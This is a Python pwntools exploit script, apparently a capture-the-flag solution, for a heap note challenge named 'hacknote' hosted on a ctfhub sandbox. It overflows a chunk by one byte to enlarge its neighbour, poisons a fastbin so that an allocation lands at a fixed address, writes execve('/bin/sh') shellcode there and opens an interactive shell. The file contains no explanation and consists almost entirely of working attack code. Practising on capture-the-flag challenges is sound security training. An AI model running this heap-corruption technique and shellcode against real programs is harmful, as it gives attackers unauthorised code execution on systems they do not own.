from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
prog = './hacknote'
elf = ELF(prog)
#p = process(prog)

p = remote("challenge-38de060a990b8772.sandbox.ctfhub.com", 22263)
    	
def add(size, content):
	p.sendline("1")
	p.sendlineafter("Size:\n", str(size))
	p.sendlineafter("Note:\n", content)
def edit(idx, content):
	p.sendline("3")
	p.sendlineafter("Note:\n", str(idx))
	p.sendafter("Note:\n", content)
def free(idx):
	p.sendline("2")
	p.sendlineafter("Note:\n", str(idx))
def exp():
	target = 0x6cb772
	add(0x18, 'a')#0
	add(0x18, 'a')#1
	add(0x38, 'a')#2
	add(0x10, 'a')#3
	free(2)
	edit(0, 'a'*0x18)
	edit(0, 'a'*0x18+'\x61')
	free(1)
	add(0x50, 'a'*0x18+p64(0x41)+p64(target))
	add(0x38, 'a')
	shellcode = '\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xd2\x48\x31\xf6\xb0\x3b\x0f\x05'

	add(0x38, 'a'*6+p64(0x6cb788+0x8)+shellcode)
	#dbg()

	p.interactive()
if __name__ == '__main__':
	exp()
